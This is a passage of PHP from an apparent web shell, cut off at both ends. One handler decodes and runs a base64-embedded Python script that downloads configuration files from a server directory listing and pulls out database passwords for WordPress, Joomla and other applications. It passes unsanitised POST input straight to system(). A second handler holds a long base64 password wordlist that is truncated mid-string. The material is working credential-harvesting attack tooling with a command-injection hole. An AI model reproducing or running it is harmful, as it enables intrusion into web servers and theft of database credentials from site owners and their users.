@ini_set('output_buffering',0);
$i = getenv('REMOTE_ADDR');
$d = date('D, M jS, Y H:i',time());
$h = $_SERVER['HTTP_HOST'];
$dir=$_SERVER['PHP_SELF'];
mkdir('config_wordlist',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center><br><br><b>+--=[ Cracking Password Config ]=--+</b><br><br>
<textarea style=\"background:black;outline:none;\" cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config_wordlist");
unlink ('cp.py');
echo"</textarea>
</center><br>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."> << BACK</a>";
exit;
}
if($_POST['passlis']=='passwordlis'){
@error_reporting(0);
@ini_set('output_buffering',0);
$wordlist = "MTIzNDU2DQoxMjM0NTY3DQoxMjM0NTY3OA0KMTU5MTU5DQoxMTIyMzMNCjMzMjIxMQ0KMTQ3ODk2Mw0KMTQ3ODk2My4NCmNwYW5lbA0KdXNlcg0KcGFzc3dkDQpwYXNzd29yZHMNCjE1OTM1Nw0KMzU3OTUxDQoxMTQ0NzcNCjEyMzQ1DQowMDAwDQpyb290DQp0b29yDQphZG1pbg0Kb21nDQpoZWxsbzENCmlsb3ZldQ0KY2FrZTEyMw0Kc3VuMTIzDQpzdW5idXJuDQppbGlrZWNha2UNCjEyMzQyNDINCm15bmFtZWlzDQp3YXJyaW9yDQpydW5lc2NhcGUNCmhhYmJvMQ0KaGFiYm8xMjMNCmhhYmJvaGFiYm8NCjMzNDM0NQ0KaWxpa2V1DQpjYWtlMTIzDQpmaXNoMTIzDQp0aHJvbmUxMjMNCnRocm9uZTENCmRpbm9lZ2cxMjMNCmRpbm8xDQpmdWNraW5naGVsbDENCm9tZ29tZ29tZzENCnNoaXRmYWNlMQ0Kc2hpdGZhY2UNCmNoZWVzZTEyMw0KY2hlZXNlMQ0KaG91c2luZzENCmhvdXMxDQpob3VzZTENCm11bQ0KaWxvdmVtdW0NCmlhbWdvb2QNCmlsb3ZleXUNCnF3ZXJ0eQ0KcXdlcnR5dWlvcA0KcXdlcnR5dWlvcDENCnF3ZXJ0eTEyMw0KcXdlcnR5dWlvcDEyMw0KcXdlcnR5MQ0KdGhvbWFzDQphcnNlbmFsDQptb25rZXkNCmNoYXJsaWUNCjEyMzQ1Ng0KbGV0bWVpbjENCmxpdmVycG9vbDENCnBhc3N3b3JkMQ0KdGhvbWFzMQ0KYXJzZW5hbDENCm1vbmtleTENCmNoYXJsaWUxDQoxMjM0NTYxDQpsZXRtZWluMQ0KbGl2ZXJwb29sMQ0KcGFzc3dvcmQxDQpsZXRtZWluMQ0KbGl2ZXJwb29sMQ0KcGFzc3dvcmQxDQp0aG9tYXMxMjMNCmFyc2VuYWwxMjMNCm1vbmtleTEzDQpjaGFybGllMTIzMg0KMTIzNDU2MTIzDQpsZXRtZWluMTIzDQpsaXZlcnBvb2wxMjMNCnBhc3N3b3JkMTIzDQpsZXRtZWluMQ0KbGl2ZXJwb29sMQ0KcGFzc3dvcmQxDQp0aG9tYXMxDQphcnNlbmFsMQ0KbW9ua2V5MQ0KY2hhcmxpZTENCjEyMzQ1NjENCmxldG1laW4xDQpsaXZlcnBvb2wxDQpwYXNzd29yZDFoYQ0KbG9naW4NCnBsZWFzZQ0KcGxlYXNlMQ0KbG9naW4xMjMNCm9wZW5vcGVuDQppbGlrZXJ1bmVzY2FwZQ0KbGV0bWVpbnBsZWFzZQ0KMTQyMzU2Nzg5DQoxMjM0NTY3ODkNCmlmdWNrDQpmdWNrbWUNCmZ1Y2ttZTENCmJhc3RhcmQNCmJhc3RhcmQxDQprYWthMQ0KZ2lybA0KYm95DQppbG92ZWdpcmxzMQ0KaWxvdmVib3lzMQ0KaWxvdmVnaXJscw0KaWxvdmVib3lzDQpmYWNrYWRvb2RsZWRvbw0KZmFja2Fkb29kbGVkb28xDQptYW51MQ0KbWFudQ0KbWFudTEyMw0KaWxvdmVtYW51MQ0KbWFudXdvbzEyDQpteW5hbWUNCmxldG1laW4xMjMNCmZ1Y2t1DQpmdWNrdTENCmZ1Y2t5b3UxDQpmdWNreW91MTIzDQppYW0xNA0KaWZ1Y2tzaGVlcDEyMw0KZnVja29tZzEyMw0KaWxvdmVoYWJibzEyMw0KYnVsbHlidXN0ZXJzMTIzDQpsZWljZXN0ZXJzaGlyZQ0KbG9uZG9uDQpiaXJtaW5naGFtDQpsZWljZXN0ZXJzaGlyZTENCmxvbmRvbjENCmJpcm1pbmdoYW0xDQowMDAwMDANCjAwMDAwMDAwDQoxMTExMTENCjExMTExMTExDQoxMjEyMTINCjEyMzEyMw0KMTIzNDU2DQoxMjM0NTY3DQoxMjM0NTY3OA0KMTIzNDU2Nzg5DQoxMjM0NjcNCjEyMzQ2NzgNCjEyMzQ2Nzg5DQoxMjM0Njc4OTANCjEyMzRxd2VyDQoxMjNhYmMNCjEyM2FzZA0KMTIzcXdlDQo2NTQzMjENCjg4ODg4ODg4DQphYmMxMjMNCmFjYWRlbWlhDQphY2FkZW1pYw0KYWNjZXB0DQpBQ0NFU1MNCmFjY2Vzcw0KYWNjb3VudA0KYWNjb3VudGluZw0KYWNjb3VudHMNCmFjdGlvbg0KYWRtaW4xMjMNCkFkbWluaXN0cmFkb3INCkFkbWluaXN0cmF0ZXVyDQphZG1pbmlzdHJhdG9yDQpBRE1JTklTVFJBVE9SDQpBZG1pbmlzdHJhdG9yDQphZHJpYW4NCmFkcmlhbm5hDQphZXJvYmljcw0KYWlycGxhbmUNCmFsYXNrYQ0KYWxiYW55DQphbGJhdHJvcw0KYWxiYXRyb3NzDQphbGJlcnQNCmFsZXhhbmRlDQpBbGV4YW5kZXINCmFsZ2VicmENCmFsaWFzZXMNCmFsaWNpYQ0KYWxpc29uDQphbGxpc29uDQphbHBoYWJldA0KYW1hZGV1cw0KYW1hbmRhDQphbWVyaWNhDQphbW9ycGhvdQ0KYW1vcnBob3VzDQphbmFsb2cNCmFuYXJjaGlzDQphbmFyY2h5DQphbmNob3INCmFuZHJlYQ0KYW5kcm9pZA0KYW5kcm9tYWMNCmFuZHJvbWFjaGUNCmFuZ2VsYQ0KYW5nZXJpbmUNCmFuaW1hbA0KYW5pbWFscw0KYW5uZXR0ZQ0KYW5vbnltb3UNCmFuc3dlcg0KYW50aHJheA0KYW50aHJvcG8NCmFudGhyb3BvZ2VuaWMNCmFudmlscw0KYW55dGhpbmcNCmFwb2xsbzEzDQphcmlhZG5lDQphcmxlbmUNCmFydGh1cg0KYXJ0aXN0DQphc2RmZ2gNCmFzc2hvbGUNCmF0aGVuYQ0KYXRtb3NwaGUNCmF0bW9zcGhlcmUNCmF0dGFjaw0KYXV0aG9yaXoNCmF6dGVjcw0KYmFjY2h1cw0KYmFja2Rvb3INCkJBQ0tVUA0KYmFja3VwDQpiYWRhc3MNCmJhaWxleQ0KYmFuYW5hDQpiYW5hbmFzDQpiYW5kaXQNCmJhcmJhcmENCmJhcmJlcg0KYmFyaXRvbmUNCmJhcnRtYW4NCmJhc2ViYWxsDQpiYXNzb29uDQpiYXRtYW4NCmJlYW1tZXVwDQpiZWF0ZXINCmJlYXV0eQ0KYmVhdmVyDQpiZWV0aG92ZQ0KYmVldGhvdmVuDQpiZWhlYWQNCmJlbG92ZWQNCmJlb3d1bGYNCmJlcmtlbGV5DQpiZXJsaW4NCmJlcmxpbmVyDQpiZXRzaWUNCmJldmVybHkNCmJpY2FtZXJhDQpiaWNhbWVyYWwNCmJpZ2Zvb3QNCmJpbmFyeQ0KYmlzaG9wDQpiaXRtYXANCmJpdG5ldA0KYmxvbmRlDQpibG9uZGllDQpibG9vZGF4ZQ0KYmxvd2pvYg0KYm95c2NvdXQNCmJyYWRsZXkNCmJyYW5kaQ0KYnJhbmR5DQpicmVhc3QNCmJyZW5kYQ0KYnJpZGdldA0KYnJvYWR3YXkNCmJyb3RoZWwNCmJydW5ldHRlDQpicnV0ZWZvcg0KYnVsbHNoaXQNCmJ1bWJsaW5nDQpidXJnZXNzDQpidXR0aGVhZA0KY2FsaWZvcm4NCmNhbWlsbGUNCmNhbXBhbmlsDQpjYW1wYW5pbGUNCmNhbXBpbmcNCmNhbnRvcg0KY2FwaXRvbA0KY2FwdGFpbg0KY2FwdHVyZQ0KY2FyZGluYWwNCmNhcm1lbg0KY2Fyb2xlDQpjYXJvbGluYQ0KY2Fyb2xpbmUNCmNhcnJpZQ0KY2Fyc29uDQpjYXNjYWRlcw0KY2FzdGxlDQpjYXRoZXJpbg0KY2F0aGVyaW5lDQpjYXRob2xpYw0KY2F5dWdhDQpjZWNpbHkNCmNlbHRpYw0KY2VsdGljcw0KY2VydWxlYW4NCmNoYW5nZQ0KQ2hhbmdlbWUNCmNoYW5nZW1lDQpjaGFyaXR5DQpjaGFybGVzDQpjaGFybGllDQpjaGFybWluZw0KY2hhcm9uDQpjaGVtaXN0cg0KY2hlbWlzdHJ5DQpjaGVzdGVyDQpjaHJpc3Rpbg0KY2hyaXN0aW5hDQpjaHJpc3RpbmUNCmNocmlzdHkNCmNpZ2FyZXR0DQpjbGFzc2VzDQpjbGFzc2ljDQpjbGF1ZGlhDQpjbGF5bW9yZQ0KY2xlYXZhZ2UNCmNsaW50b24NCmNsdXN0ZXINCmNsdXN0ZXJzDQpjb2NhY29sYQ0KY29jYWluY28NCmNvZGVuYW1lDQpjb2Rld29yZA0KY29mZmVlDQpjb2xsaW5zDQpjb21iYXQNCmNvbWljcw0KY29tbWl0DQpjb21tcmFkZQ0KY29tbXJhZGVzDQpjb21wYW55DQpjb21wYXENCmNvbXB1dGVyDQpjb21wdXRpbg0KY29tcmFkZQ0KY29tcmFkZXMNCmNvbmRvbQ0KY29ubmVjdA0KY29ubmllDQpjb25zZXJ2YQ0KY29uc29sZQ0KY29udGludWUNCmNvbnRyb2wNCmNvb2tib29rDQpjb29raWUNCmNvb3Blcg0KY29wcGVyDQpjb3JuZWxpdQ0KY29ybmVsaXVzDQpjb3JyZWN0DQpjb3VudGVycw0KY291bnRyeQ0KY291c2NvdXMNCmNvd2JveQ0KY3JhY2twb3QNCmNyZWF0ZQ0KY3JlYXRpb24NCmNyZWF0dXJlDQpjcmVkaXQNCmNyZW9zb3RlDQpjcmV0aW4NCmNyaW1pbmFsDQpjcmlzdGluYQ0KY3J5c3RhbA0KY3VzdG9tZXINCmN5YmVycHVuDQpjeWJlcnNwYQ0KY3ludGhpYQ0KZGFlbW9uDQpkYW5jZXINCmRhbmllbA0KZGFuaWVsbGUNCmRhcHBlcg0KZGFya2F2ZW4NCmRhdGFiYXNlDQpkYXRhYmFzZXBhc3MNCmRhdGFiYXNlcGFzc3dvcmQNCmRiMTIzNA0KZGJwYXNzDQpkYnBhc3N3b3JkDQpkZWF0aHN0YQ0KZGViYmllDQpkZWJvcmFoDQpkZWNlbWJlcg0KREVGQVVMVA0KRGVmYXVsdA0KZGVmYXVsdA0KZGVsdWdlDQpkZW1vY3JhdA0KZGVuaXNlDQpkZW5uaXMNCmRlc2lyZWUNCmRlc2t0b3ANCmRlc3BlcmF0DQpkZXNwZXJhdGUNCmRldmVsb3ANCmRldmljZQ0KZGlhbW9uZA0KZGllaGFyZA0KZGlldGVyDQpkaWdpdGFsDQpkaW5vc2F1cg0KZGlwc2hpdA0KZGlyZWN0DQpkaXJlY3Rvcg0KZGlzY2lwbGkNCmRpc2Nsb3NlDQpkaXNjb3Zlcg0KZGlzY292ZXJ5DQpkaXNrZXR0ZQ0KZGlzbmV5DQpkaXNwbGF5DQpkb2N0b3INCmRvbGxhcg0KZG9tYWluDQpkb21haW5wYXNzDQpkb21haW5wYXNzd29yZA0KZG9uYWxkZHVjaw0KZG9vbWlpDQpkb29tc2RheQ0KZG9vbmVzYnUNCmRvd25sb2FkDQpkcmFnb24NCmRyZG9vbQ0KZHJvdWdodA0KZHVkZXR0ZQ0KZHVlbGlzdA0KZHVuY2FuDQpkdW5nZW9uDQplYXNpZXINCmVkaW5idXJnDQplZGluYnVyZ2gNCmVkaXRpb24NCmVkdWNhdGlvDQplZHVjYXRpb24NCmVkd2luYQ0KZWdnaGVhZA0KZWlkZXJkb3cNCmVpZGVyZG93bg0KZWlsZWVuDQplaW5zaWVpbg0KZWluc3RlaW4NCmVsYWluZQ0KZWxhbm9yDQplbGVjdHJvbg0KZWxlcGhhbnQNCmVsaXphYmV0DQplbGl6YWJldGgNCmVtZXJhbGQNCmVtbWFudWVsDQplbmFibGUNCmVuZ2luZQ0KZW5naW5lZXINCmVuZ2xhbmQNCmVuZ2xpc2gNCmVudGVycHJpDQplbnRlcnByaXNlDQplbnp5bWUNCmVyZW5pdHkNCmVyb3RpYw0KZXJzYXR6DQplc3RhYmxpcw0KZXN0YWJsaXNoDQplc3RhdGUNCmV0ZXJuaXR5DQpldWNsaWQNCmV2ZWx5bg0KZXhjaGFuZ2UNCmV4Y2huZ2UNCmV4cGVydA0KZXhwbG9kZQ0KZXhwbG9yZQ0KZXhwbG9yZXINCmV4cGxvc2l2DQpleHRlbnNpbw0KZXh0ZW5zaW9uDQpmYWlyd2F5DQpmYWxjb24NCmZhbWlseQ0KZmFyYWRheQ0KZmVsaWNpYQ0KZmVuZGVyDQpmZXJtYXQNCmZlcnJhcmkNCmZpZGVsaXR5DQpmaW5pdGUNCmZpcmV3YWxsDQpmaXNoZXJzDQpmbGFrZXMNCmZsb3JpZGENCmZsb3dlcg0KZmxvd2Vycw0KZm9vYmFyDQpmb29scHJvbw0KZm9vbHByb29mDQpmb290YmFsbA0KZm9yZXNpZ2gNCmZvcmVzaWdodA0KZm9yZXZlcg0KZm9ybWF0DQpmb3JuaWNhdA0KZm9yc3l0aGUNCmZvdXJpZXINCmZveHRyb3QNCmZyYW5jZQ0KZnJlZGR5DQpmcmVlZG9tDQpmcmVuY2gNCmZyaWRheQ0KZnJpZW5kDQpmcmllbmRzDQpmcmlnaHRlbg0KZnJ5Z3V5DQpmdWNrZWQNCmZ1Y2tlcg0KZnVja2luZw0KZnVja21lDQpmdWNreW91DQpmdW5jdGlvbg0KZnVuZ2libGUNCmdhYnJpZWwNCmdhcmRuZXINCmdhcmZpZWxkDQpnYXRld2F5DQpnYXRoZXJpbg0KZ2VvcmdlDQpnZXJ0cnVkZQ0KZ2lic29uDQpnaWdhYnl0ZQ0KZ2luZ2VyDQpnbGFjaWVyDQpnb2RibGVzc3lvdQ0KZ29sZGVuDQpnb2xmZXINCmdvcmdlb3VzDQpnb3JnZXMNCmdvc2xpbmcNCmdvdmVybWVuDQpncmFkZXMNCmdyYWhhbQ0KZ3J5cGhvbg0KZ3VhcmRpYW4NCmd1ZXNzbWUNCmd1aXRhcg0KZ3VtcHRpb24NCmd1bnRpcw0KaDR4MHIxbmcNCmg0eDByaW5nDQpoNHgxbmcNCmhhY2tlZA0KaGFja2VyDQpoYWxsb3dlZQ0KaGFtbGV0DQpoYW1zdGVyDQpoYW5kZWwNCmhhbmRpbHkNCmhhbmRqb2INCmhhcHBlbmluDQpoYXBwZW5pbmcNCmhhcmRjb3JlDQpoYXJkZHJpdg0KaGFybW9ueQ0KaGFyb2xkDQpoYXJ2ZXkNCmhhd2FpaQ0KaGF4aW5nDQpoZWFkYmFuZw0KaGVhZG9mZmljZQ0KaGVhdGhlbg0KaGVhdGhlcg0KaGVhdmVuDQpoZWJyaWRlc